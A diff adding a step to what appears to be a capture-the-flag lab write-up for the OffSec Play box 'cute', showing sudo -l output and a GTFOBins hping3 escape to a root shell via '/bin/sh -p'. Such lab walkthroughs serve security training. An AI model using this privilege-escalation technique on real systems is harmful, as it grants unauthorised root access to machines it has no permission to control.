@@ -372,3 +372,26 @@ whoami && id
 www-data
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+
+GTFOBins hping3
+![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/6cfbdf97-f835-4bf3-91fd-e778011a0b09)
+
+```
+$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on cute:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on cute:
+    (root) NOPASSWD: /usr/sbin/hping3 --icmp
+$ /usr/sbin/hping3
+/usr/sbin/hping3
+hping3> /bin/sh -p
+/bin/sh -p
+# whoami && id
+whoami && id
+root
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
+```
+![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/7771d3c6-59ca-42ec-9219-e73495052e28)
